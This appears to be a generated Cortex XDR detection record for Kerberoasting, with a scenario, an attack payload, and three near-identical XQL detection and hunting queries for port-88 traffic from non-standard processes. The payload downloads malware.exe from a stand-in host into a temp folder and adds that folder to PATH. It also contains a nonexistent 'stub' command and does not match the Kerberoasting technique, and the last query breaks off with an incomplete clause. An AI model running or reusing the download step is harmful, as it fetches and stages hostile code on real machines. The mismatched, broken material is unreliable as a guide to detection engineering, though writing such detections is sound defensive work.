identity.description: An attacker uses a non-standard Windows process to initiate Kerberos traffic, bypassing normal authentication flows. Cortex should detect this behavior as anomalous and flag the process and network activity.

techniques.name: Steal or Forge Kerberos Tickets: Kerberoasting

payload.code:
cd C:\Windows\Temp
wget http://192.0.2.10/malware.exe -OutFile malware.exe
stub malware.exe
$env:PATH = $env:PATH + ";C:\Windows\Temp"

biocs.name: Kerberos Traffic from Non-Standard Process
biocs.description: Detection of Kerberos traffic initiated from a process not typically used for authentication
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.NETWORK and event_sub_type = ENUM.NETWORK_CONNECTION
| filter dst_port = 88
| filter actor_process_image_name != 'lsass.exe' and actor_process_image_name != 'klist.exe'
| filter action_remote_ip in (192.0.2.0/24)

abiocs.name: Unusual Kerberos Process Initiation
abiocs.description: Behavioral deviation detected when a non-standard process initiates Kerberos traffic
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.NETWORK and event_sub_type = ENUM.NETWORK_CONNECTION
| filter dst_port = 88
| filter actor_process_image_name != 'lsass.exe' and actor_process_image_name != 'klist.exe'
| filter action_remote_ip in (192.0.2.0/24)
| comp by actor_process_image_name

xql_queries.name: Kerberos Traffic from Non-Standard Process Hunt
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.NETWORK and event_sub_type = ENUM.NETWORK_CONNECTION
| filter dst_port = 88
| filter actor_process_image_name != 'lsass.exe' and actor_process_image_name != 'klist.exe'
| filter action_remote_ip in (192.0.2.0/24)
| comp count() as cnt by actor_process_image_name, action_remote_ip
| comp count() as cnt by
